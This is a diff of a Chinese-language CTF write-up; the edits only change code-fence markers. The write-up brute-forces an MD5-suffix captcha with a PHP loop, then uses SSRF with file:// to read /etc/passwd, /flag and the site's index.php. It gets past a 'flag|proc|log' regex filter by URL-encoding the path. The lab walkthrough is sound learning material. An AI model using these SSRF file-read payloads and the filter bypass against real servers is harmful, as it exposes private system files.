@@ -1,6 +1,6 @@
 ### write up 
 Captcha的地方写着代码：substr(md5(captcha), -6, 6) == "974961"，很明显验证码的md5值的后六位要等于指定的数字。
-    '''json
+~~~
           <?php
 for ($i=0; $i < 1000000000; $i++) {
     $a = substr(md5($i), -6, 6);
@@ -10,7 +10,7 @@ for ($i=0; $i < 1000000000; $i++) {
     }
 }
 ?>
-  '''
+~~~
 
 
 解决了验证码的问题后，我们可以试着通过SSRF中URL伪协议file://来访问服务器的文件，例如/etc/passwd
@@ -20,6 +20,7 @@ url=file:///flag&captcha=*****
 再试试看能不能读网页的源代码
 url=file:///var/www/html/index.php&captcha=*****
 ******************code************************
+~~~
 <?php
 error_reporting(0);
 session_start();
@@ -47,7 +48,7 @@ if (isset($_POST['url']) && isset($_POST['captcha']) && !empty($_POST['url']) &&
         $is_die = 1;
     }
 }
-
+~~~
 阅读源码，发现确实对flag进行了过滤 preg_match('/flag|proc|log/i', $url) ，那么就需要对preg_match函数进行绕过。
 同时因为/i 表明不区分大小写，因此无法通过大小写绕过。试试URL编码，file:///%66%6c%61%67
 url=file:///%66%6c%61%67&captcha=*****
